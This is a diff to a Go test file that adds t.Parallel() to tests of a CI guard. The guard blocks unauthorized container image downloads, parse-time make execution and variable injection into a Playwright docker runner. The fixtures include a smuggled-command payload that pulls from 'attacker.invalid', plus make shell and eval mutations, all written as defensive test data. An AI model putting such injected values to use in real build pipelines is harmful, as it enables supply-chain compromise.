@@ -15,6 +15,7 @@ import (
 )
 
 func TestVerifyCIContainerDownloadsRejectsPostgresAcquisitionInAnyWorkflow(t *testing.T) {
+	t.Parallel()
 	tests := map[string]string{
 		"service": `name: extra
 on: push
@@ -92,6 +93,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsWorkflowAcquisitionOutsideMakeRoute(t *testing.T) {
+	t.Parallel()
 	tests := map[string]string{
 		"helper with opaque image": `name: extra
 on: push
@@ -179,6 +181,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsMakeExecutionControls(t *testing.T) {
+	t.Parallel()
 	mutations := map[string]string{
 		"shell":                   "SHELL := /bin/true\n",
 		"shell flags":             ".SHELLFLAGS := -c\n",
@@ -219,6 +222,7 @@ func TestVerifyCIContainerDownloadsRejectsMakeExecutionControls(t *testing.T) {
 }
 
 func TestVerifyCIContainerDownloadsRejectsConditionalMakeGraphDivergence(t *testing.T) {
+	t.Parallel()
 	tests := map[string]struct {
 		module string
 		active string
@@ -252,6 +256,7 @@ e2e-update:
 }
 
 func TestVerifyCIContainerDownloadsRejectsContinuedMakeRecipeAcquisition(t *testing.T) {
+	t.Parallel()
 	tests := map[string]string{
 		"authorized target": `.PHONY: android
 android:
@@ -297,6 +302,7 @@ jobs:
 }
 
 func TestVerifyCIContainerDownloadsRejectsUnauditedMakeDirectives(t *testing.T) {
+	t.Parallel()
 	mutations := map[string]string{
 		"ifeq":                 "ifeq (1,1)\nendif\n",
 		"leading-space ifneq":  "  ifneq (1,0)\n  endif\n",
@@ -327,6 +333,7 @@ func TestVerifyCIContainerDownloadsRejectsUnauditedMakeDirectives(t *testing.T) 
 }
 
 func TestVerifyCIContainerDownloadsRejectsParseTimeMakeExecution(t *testing.T) {
+	t.Parallel()
 	mutations := map[string]string{
 		"parenthesized shell":              `SIDE_EFFECT := $(shell printf harmless)`,
 		"braced shell":                     `SIDE_EFFECT := ${shell printf harmless}`,
@@ -361,6 +368,7 @@ func TestVerifyCIContainerDownloadsRejectsParseTimeMakeExecution(t *testing.T) {
 }
 
 func TestParseTimeMakeExecutionProbesAreRealGNUmakeRedCases(t *testing.T) {
+	t.Parallel()
 	forms := map[string]string{
 		"shell parenthesis": "SIDE_EFFECT := $(shell touch %s)",
 		"shell braces":      "SIDE_EFFECT := ${shell touch %s}",
@@ -403,6 +411,7 @@ func parseTimeProbeMarkerOK(name string, guileSupported bool, markerErr error) b
 }
 
 func TestParseTimeProbeMarkerOK(t *testing.T) {
+	t.Parallel()
 	tests := []struct {
 		name           string
 		probe          string
@@ -425,6 +434,7 @@ func TestParseTimeProbeMarkerOK(t *testing.T) {
 }
 
 func TestVerifyCIContainerDownloadsRejectsParseTimeProtectedTargetChanges(t *testing.T) {
+	t.Parallel()
 	mutations := map[string]string{
 		"parenthesized protected target replacement": `$(eval test-pg: ; @:)`,
 		"braced protected target replacement":        `${eval test-pg: ; @:}`,
@@ -446,6 +456,7 @@ func TestVerifyCIContainerDownloadsRejectsParseTimeProtectedTargetChanges(t *tes
 }
 
 func TestVerifyCIContainerDownloadsRequiresExactPlaywrightVariableIsolation(t *testing.T) {
+	t.Parallel()
 	for name, replacement := range map[string]string{
 		"missing":    "",
 		"partial":    "unexport PW_DOCKER_USER PW_IMAGE",
@@ -470,6 +481,7 @@ func TestVerifyCIContainerDownloadsRequiresExactPlaywrightVariableIsolation(t *t
 }
 
 func TestVerifyCIContainerDownloadsRejectsPlaywrightPreImageAssignments(t *testing.T) {
+	t.Parallel()
 	mutations := map[string]func(string) string{
 		"Docker arguments": func(frontend string) string {
 			return "PW_DOCKER_USER ?= --pull=always\n" + frontend
@@ -500,6 +512,7 @@ func TestVerifyCIContainerDownloadsRejectsPlaywrightPreImageAssignments(t *testi
 }
 
 func TestPlaywrightPlainValuesCannotChangeContainerBoundary(t *testing.T) {
+	t.Parallel()
 	variables := []string{"PW_DOCKER_USER", "PW_CI", "PW_REAL_CI", "PW_IMAGE", "PW_SHARD"}
 	payloads := map[string]string{
 		"semicolon":    "--user 0; docker pull attacker.invalid/plain:pinned; docker run --rm",
@@ -524,6 +537,7 @@ func TestPlaywrightPlainValuesCannotChangeContainerBoundary(t *testing.T) {
 }
 
 func TestPlaywrightExternalOverridesHaveNoRecipeExpansionSeam(t *testing.T) {
+	t.Parallel()
 	_, source, _, _ := runtime.Caller(0)
 	root := filepath.Join(filepath.Dir(source), "..", "..")
 	frontend, err := readActiveMakefile(filepath.Join(root, "mk", "frontend.mk"))
@@ -546,6 +560,7 @@ func TestPlaywrightExternalOverridesHaveNoRecipeExpansionSeam(t *testing.T) {
 }
 
 func TestPlaywrightContainerRunnerBuildsFixedDockerBoundary(t *testing.T) {
+	t.Parallel()
 	_, source, _, _ := runtime.Caller(0)
 	root := filepath.Join(filepath.Dir(source), "..", "..")
 	runner := filepath.Join(root, "scripts", "run-playwright-container.sh")
